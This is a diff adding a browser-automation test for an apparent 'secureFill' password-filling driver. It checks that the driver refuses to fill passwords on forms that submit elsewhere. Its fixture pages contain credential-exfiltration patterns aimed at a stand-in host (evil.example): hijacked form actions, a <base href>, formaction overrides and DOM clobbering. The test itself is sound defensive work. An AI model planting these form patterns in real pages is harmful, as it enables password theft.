@@ -540,3 +540,128 @@ test(
     }
   },
 );
+
+test(
+  "secureFill fails closed on auto-submit, off-origin form action, <base href>, submitter formaction, and DOM clobbering; allows same-origin fill-only",
+  { skip: !chromeBin ? "No Chromium/Chrome binary available on this host" : false },
+  async () => {
+    const driverCode = readFileSync(driverBundlePath, "utf8");
+    const pages = {
+      "/ok": `<!doctype html><html><body>
+        <form id="f" method="post" action="/login">
+          <input id="pw" name="password" type="password" value="">
+          <button id="go" type="submit">Sign In</button>
+        </form>
+      </body></html>`,
+      "/evil-action": `<!doctype html><html><body>
+        <form id="f" method="post" action="https://evil.example/collect">
+          <input id="pw" name="password" type="password" value="">
+          <button id="go" type="submit">Sign In</button>
+        </form>
+      </body></html>`,
+      "/evil-base": `<!doctype html><html><head><base href="https://evil.example/"></head><body>
+        <form id="f" method="post" action="collect">
+          <input id="pw" name="password" type="password" value="">
+          <button id="go" type="submit">Sign In</button>
+        </form>
+      </body></html>`,
+      "/evil-formaction": `<!doctype html><html><body>
+        <form id="f" method="post" action="/login">
+          <input id="pw" name="password" type="password" value="">
+          <button id="go" type="submit" formaction="https://evil.example/steal">Sign In</button>
+        </form>
+      </body></html>`,
+      "/evil-external-submitter": `<!doctype html><html><body>
+        <form id="f" method="post" action="/login">
+          <input id="pw" name="password" type="password" value="">
+        </form>
+        <button id="ext-go" type="submit" form="f" formaction="https://evil.example/steal">External</button>
+      </body></html>`,
+      "/evil-clobbered": `<!doctype html><html><body>
+        <form id="f" method="post" action="https://evil.example/collect">
+          <input name="action" value="/local-decoy">
+          <input id="pw" name="password" type="password" value="">
+          <button id="go" type="submit">Sign In</button>
+        </form>
+      </body></html>`,
+    };
+    const server = http.createServer((req, res) => {
+      const path = (req.url || "/").split("?")[0];
+      if (!Object.hasOwn(pages, path)) {
+        res.writeHead(404);
+        res.end("Not found");
+        return;
+      }
+      res.writeHead(200, { "Content-Type": "text/html; charset=utf-8" });
+      res.end(pages[path]);
+    });
+    await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
+    const { port } = server.address();
+    const origin = `http://127.0.0.1:${port}`;
+    const browser = await launchChromium(chromeBin);
+    const dummySecret = "dummy-test-pass-001";
+
+    async function runSecureFillOn(path, payload) {
+      await browser.navigate(`${origin}${path}`);
+      const frameTree = await browser.cdp.send("Page.getFrameTree");
+      const isolated = await browser.cdp.send("Page.createIsolatedWorld", {
+        frameId: frameTree.frameTree.frame.id,
+        worldName: `botkins-sec-${path}`,
+      });
+      const ctxId = isolated.executionContextId;
+      await browser.cdp.evalInContext(driverCode, { contextId: ctxId });
+      const res = await browser.cdp.evalInContext(
+        `window.__botkinsDomDriver.dispatch("secureFill", ${JSON.stringify(payload)})`,
+        { contextId: ctxId },
+      );
+      const pwVal = await browser.cdp.evalInContext(`document.getElementById("pw")?.value ?? ""`);
+      return { res, pwVal };
+    }
+
+    try {
+      // Allow: same-origin fill-only succeeds
+      const okRes = await runSecureFillOn("/ok", {
+        expectedOrigin: origin,
+        allowLocalHttp: true,
+        fields: [{ selector: "#pw", kind: "password", value: dummySecret }],
+        submit: false,
+      });
+      assert.equal(okRes.res.ok, true);
+      assert.equal(okRes.res.submitted, false);
+      assert.equal(okRes.pwVal, dummySecret);
+
+      // Deny: auto-submit fails closed without filling
+      const subRes = await runSecureFillOn("/ok", {
+        expectedOrigin: origin,
+        allowLocalHttp: true,
+        fields: [{ selector: "#pw", kind: "password", value: dummySecret }],
+        submit: { selector: "#go" },
+      });
+      assert.equal(subRes.res.ok, false);
+      assert.equal(subRes.res.reason, "auto-submit-disabled");
+      assert.equal(subRes.pwVal, "", "Auto-submit refusal must not fill the field");
+
+      // Deny: all off-origin / clobbered effective submit destinations fail closed BEFORE filling
+      for (const badPath of [
+        "/evil-action",
+        "/evil-base",
+        "/evil-formaction",
+        "/evil-external-submitter",
+        "/evil-clobbered",
+      ]) {
+        const denied = await runSecureFillOn(badPath, {
+          expectedOrigin: origin,
+          allowLocalHttp: true,
+          fields: [{ selector: "#pw", kind: "password", value: dummySecret }],
+          submit: false,
+        });
+        assert.equal(denied.res.ok, false, `Expected ${badPath} to fail closed`);
+        assert.equal(denied.res.reason, "origin-mismatch", `Expected origin-mismatch for ${badPath}`);
+        assert.equal(denied.pwVal, "", `${badPath} must never write dummy secret into input`);
+      }
+    } finally {
+      await browser.close();
+      server.close();
+    }
+  },
+);
